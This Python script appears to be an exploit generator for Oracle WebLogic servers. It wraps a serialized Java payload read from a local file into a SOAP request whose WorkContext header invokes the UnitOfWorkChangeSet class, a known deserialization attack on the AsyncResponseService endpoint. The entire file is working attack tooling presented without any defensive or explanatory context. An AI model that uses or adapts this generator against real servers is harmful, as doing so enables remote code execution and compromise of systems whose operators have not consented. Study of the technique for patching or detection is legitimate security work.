#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2019-11-08 18:32:22
# @Author  : Mote(mrzhangsec@163.com)



import os
of = open('payload_encoded','w')
payload = open('payload').read()

of.write('<?xml version="1.0" encoding="utf-8"?>\n')
of.write('<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">\n')
of.write(' <soapenv:Header>\n')
of.write('  <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">\n')
of.write('   <java>\n')
of.write('    <array method="forName">\n')
of.write('     <string>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</string>\n')
of.write('     <void>\n')
of.write('      <array class="byte" length="%d">\n' % len(payload) )

for i in range(len(payload)):
    byte = payload[i]
    v = ord(byte)
    if v >= 128:
        v = -256+v
    of.write('       <void index="%d">\n' % i)
    of.write('        <byte>%d</byte>\n' % v)
    of.write('       </void>\n')

of.write('      </array>\n')
of.write('     </void>\n')
of.write('    </array>\n')
of.write('   </java>\n')
of.write('  </work:WorkContext>\n')
of.write(' </soapenv:Header>\n')
of.write(' <soapenv:Body/>\n')
of.write('</soapenv:Envelope>\n')